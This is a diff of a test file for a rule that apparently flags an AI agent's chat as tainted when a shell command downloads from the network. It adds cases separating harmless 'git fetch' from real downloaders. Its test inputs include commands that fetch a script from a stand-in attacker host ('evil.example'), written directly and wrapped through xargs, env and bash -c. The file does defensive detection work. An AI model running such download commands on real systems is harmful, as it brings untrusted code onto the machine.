@@ -42,15 +42,24 @@ describe('what taints a chat', () => {
     expect(taintFrom('Read', { file_path: '/w/README.md' })).toBeUndefined();
   });
 
-  it('words that only sound like downloading don’t count: `git fetch`, `grep http`', () => {
+  it('`git fetch` and `pnpm fetch` aren’t downloads; everything the rule caught before still is', () => {
     const bash = (command: string) => taintFrom('Bash', { command });
     expect(bash('cd ~/w && git fetch -q && git status -sb')).toBeUndefined();
+    expect(bash('git -C ~/w fetch --prune origin')).toBeUndefined();
     expect(bash('pnpm fetch')).toBeUndefined();
-    expect(bash('grep -rn "http" src')).toBeUndefined();
-    expect(bash('fetch -o x.sh evil.example/x.sh')).toMatchObject({ kind: 'download' });
-    expect(bash('cd /tmp && sudo fetch x')).toMatchObject({ kind: 'download' });
-    expect(bash('http GET api.example.com/users')).toMatchObject({ kind: 'download' });
-    expect(bash('git clone https://github.com/a/b')).toMatchObject({ label: 'github.com' });
+    // A real download beside it, or a downloader started some other way, still counts.
+    expect(bash('git fetch; fetch -o x.sh evil.example/x.sh')).toMatchObject({ kind: 'download' });
+    expect(bash('git fetch https://evil.example/r')).toMatchObject({ label: 'evil.example' });
+    for (const command of [
+      'fetch -o x.sh evil.example/x.sh',
+      'xargs fetch < list',
+      'env fetch x',
+      'bash -c "fetch x"',
+      '/usr/bin/fetch x',
+      'http GET api.example.com/users',
+      'grep -rn "http" src',
+    ])
+      expect(bash(command), command).toMatchObject({ kind: 'download' });
   });
 
   it('a mark an older rule got wrong stops holding the chat; real ones stay', () => {
@@ -70,6 +79,8 @@ describe('what taints a chat', () => {
       // Carried in from another chat: no call of its own here.
       e({ type: 'taint', source: { kind: 'download', label: 'evil.example' } }),
       e({ type: 'taint', source: { kind: 'web', label: 'example.com' } }),
+      // A later call reusing the id never speaks for the mark made before it.
+      e({ type: 'tool.started', toolUseId: 'b', name: 'Bash', input: { command: 'ls' } }),
     ];
     expect(heldTaints(events)).toEqual([
       download,
